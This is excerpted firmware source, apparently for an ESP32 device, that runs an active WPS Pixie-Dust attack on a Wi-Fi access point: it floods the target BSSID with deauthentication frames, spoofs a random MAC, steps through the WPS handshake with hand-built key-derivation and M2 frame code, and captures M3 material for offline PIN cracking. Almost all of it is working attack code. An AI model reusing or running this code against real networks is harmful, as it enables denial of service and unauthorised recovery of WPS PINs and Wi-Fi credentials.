...
// ============================================================
// Derive AuthKey from DH shared secret (WPS KDF, §6.5 & §7.5.2)
// AuthKey = KDF(DHKey, "Wi-Fi Easy and Secure Key Derivation",
//               Enrollee-MAC || E-Nonce || R-Nonce)[0:32]
...
static bool deriveAuthKeyFromDH(const uint8_t *eNonce,
    ...
    // WPS KDF per hostapd wps_kdf() / Wi-Fi Simple Config 2.0 §6.5:
    // HMAC-SHA256(DHKey, counter(4BE) || label || 0x00 || E-Nonce || MAC || R-Nonce || total_bits(4BE))
    // counter    = 0x00000001  (4 bytes big-endian) — NOT 1 byte
    // total_bits = 0x00000280  (640 bits, 4 bytes big-endian) — NOT 2 bytes
    // Field order: E-Nonce(16) || Enrollee-MAC(6) || R-Nonce(16)
    const uint8_t label[] = "Wi-Fi Easy and Secure Key Derivation";
    uint8_t prfInput[4 + (sizeof(label)-1) + 1 + 16 + 6 + 16 + 4];
    int pi = 0;

    // counter: 4-byte big-endian 0x00000001
    prfInput[pi++]=0x00; prfInput[pi++]=0x00;
    prfInput[pi++]=0x00; prfInput[pi++]=0x01;
    memcpy(prfInput+pi, label, sizeof(label)-1); pi += sizeof(label)-1;
    prfInput[pi++] = 0x00;                               // separator

    // PRF context per spec: E-Nonce || Enrollee-MAC || R-Nonce
    memcpy(prfInput+pi, eNonce,       16); pi += 16;
    memcpy(prfInput+pi, enrolleeMacB,  6); pi += 6;
    memcpy(prfInput+pi, rNonce,       16); pi += 16;

    // total_key_bits: 4-byte big-endian 0x00000280 (640 bits)
    prfInput[pi++]=0x00; prfInput[pi++]=0x00;
    prfInput[pi++]=0x02; prfInput[pi++]=0x80;
...
static bool deriveAuthKey(const uint8_t *dhKey32,
    ...
    // Same KDF as deriveAuthKeyFromDH — must stay in sync.
    // counter = 4-byte BE 0x00000001, total_bits = 4-byte BE 0x00000280
    static const char label[] = "Wi-Fi Easy and Secure Key Derivation";
    const size_t labelLen = strlen(label);
    uint8_t prfInput[4 + 36 + 1 + 16 + 6 + 16 + 4];
    int pi = 0;
    prfInput[pi++]=0x00; prfInput[pi++]=0x00;
    prfInput[pi++]=0x00; prfInput[pi++]=0x01;              // counter 4-byte BE
    memcpy(prfInput+pi, label, labelLen); pi += labelLen;
    prfInput[pi++] = 0x00;
    memcpy(prfInput+pi, eNonce,       16); pi += 16;
    memcpy(prfInput+pi, enrolleeMacB,  6); pi += 6;
    memcpy(prfInput+pi, rNonce,       16); pi += 16;
    prfInput[pi++]=0x00; prfInput[pi++]=0x00;
    prfInput[pi++]=0x02; prfInput[pi++]=0x80;              // total_bits 4-byte BE
    return hmacSha256(dhKey32, 32, prfInput, pi, akOut);
}
...
static uint8_t *buildM2Frame(const uint8_t *apBssid,
    ...
    auto putTlv = [&](uint16_t type, const uint8_t *val, uint16_t vlen) {
        if (wp + 4 + vlen > MAX_WPS) {
            Serial.printf("[M2] ERROR: overflow type=0x%04X\n", type);
            return;
        }
            ...
            if (eapCode == 0x01 || eapCode == 0x02) { // Request OR Response — AP M1 uses code=2
                if (eapType == 0xFE) {
                    ...
                    // ── AP retransmitting M1 ──
                        ...
                        g_lastEapId = eapId; // Always keep the ID fresh
...
static bool runActiveProbe(const String &/*tssid*/, uint8_t channel,
    ...
    // ---------------------------------------------------------------------
    // 1. Clear any stale session from previous probe (deauth + disassoc)
    // ---------------------------------------------------------------------
    {
        uint8_t clearBuf[30];
        int clen = buildDeauthFrame(clearBuf, bssid);
        for (int i = 0; i < 3; i++) {
    ...
    // Reset WPS fragment reassembly and internal state
    ...
    g_gotEapIdReq   = false;
        ...
        // In runActiveProbe, before anything else, send 10 deauth frames
    for (int i = 0; i < 10; i++) {
        uint8_t deauth[26];
        buildDeauthFrame(deauth, bssid);
    ...
    // ---------------------------------------------------------------------
    // 2. Generate a random MAC address for this probe (optional)
    // ---------------------------------------------------------------------
    generateEnrolleeMac();
    {
    ...
    // ---------------------------------------------------------------------
    // 3. 802.11 Authentication (open system)
    // ---------------------------------------------------------------------
    flen = buildAuthFrame(frameBuf, bssid);
    g_wpsState = WpsProbeState::AuthSent;
    if (!sendAndWait(frameBuf, flen, &g_gotAuthResp, 2500)) {
    ...
    // ---------------------------------------------------------------------
    // 4. 802.11 Association Request (with WPS IE, Registrar role)
    // ---------------------------------------------------------------------
    flen = buildAssocFrame(frameBuf, bssid, ssid, channel);
    g_wpsState = WpsProbeState::AssocSent;
    if (!sendAndWait(frameBuf, flen, &g_gotAssocResp, 2500)) {
        Serial.println("[WPS-Probe] Assoc timeout");
        return false;
    }
    vTaskDelay(pdMS_TO_TICKS(800));   // allow AP to settle (matches capture)

    // ---------------------------------------------------------------------
    // 5. Pre‑generate our DH keys (Registrar PKR and private X)
    // ---------------------------------------------------------------------
    if (!dhm_setup()) {
    ...
    // ---------------------------------------------------------------------
    // 6. Send Null frame (power‑save) and EAPOL-Start
    // ---------------------------------------------------------------------
    uint8_t nullBuf[24];
    ...
    // ---------------------------------------------------------------------
    // 7. Wait for EAP-Request/Identity (max 1 second), then respond
    // ---------------------------------------------------------------------
    ...
    g_gotEapIdReq = false;   // reuse flag for M1 detection

    Serial.printf("[WPS-Probe] EAP-Req/Identity id=0x%02X, sending Response\n", identId);
    ...
    // ---------------------------------------------------------------------
    // 8. Wait for AP M1 (max 2 seconds)
    // ---------------------------------------------------------------------
    g_wpsState = WpsProbeState::WaitingApM1;
    {
        ...
        vTaskDelay(pdMS_TO_TICKS(200));   // let sniffer finish parsing
    }
    Serial.printf("[WPS-Probe] AP M1 captured. Sending M2 (EAP ID=0x%02X)\n", g_lastEapId);
    vTaskDelay(pdMS_TO_TICKS(50));

    // ---------------------------------------------------------------------
    // 9. Derive shared secret, AuthKey, and build M2
    // ---------------------------------------------------------------------
    ...
    if (dhm_compute_secret(pixieCapture.pke)) {
        ...
        Serial.println("[WPS-Probe] DH secret failed");
    }
    ...
    if (!m2Frame) {
        Serial.println("[WPS-Probe] M2 allocation failed");
        return false;
    }

    // Store our PKR and R‑Nonce for later Pixie‑Dust solving
    ...
    // ---------------------------------------------------------------------
    // 10. Send M2 and wait for M3 (single attempt, 3 seconds)
    // ---------------------------------------------------------------------
    g_wpsState = WpsProbeState::WaitingApM3;
    Serial.printf("[WPS-Probe] Sending M2 (EAP ID=0x%02X)\n", m2Frame[39]);
    esp_wifi_80211_tx(WIFI_IF_STA, m2Frame, m2Len, true);

    bool gotM3 = false;
    uint32_t deadline = millis() + 3000;
    while (millis() < deadline) {
        if (pixieCapture.valid) {
            gotM3 = true;
            break;
        }
        if (check(EscPress)) {
    ...
    // ---------------------------------------------------------------------
    // 11. Clean up (send WSC_NACK and Deauth) if M3 was received
    // ---------------------------------------------------------------------
    if (gotM3) {
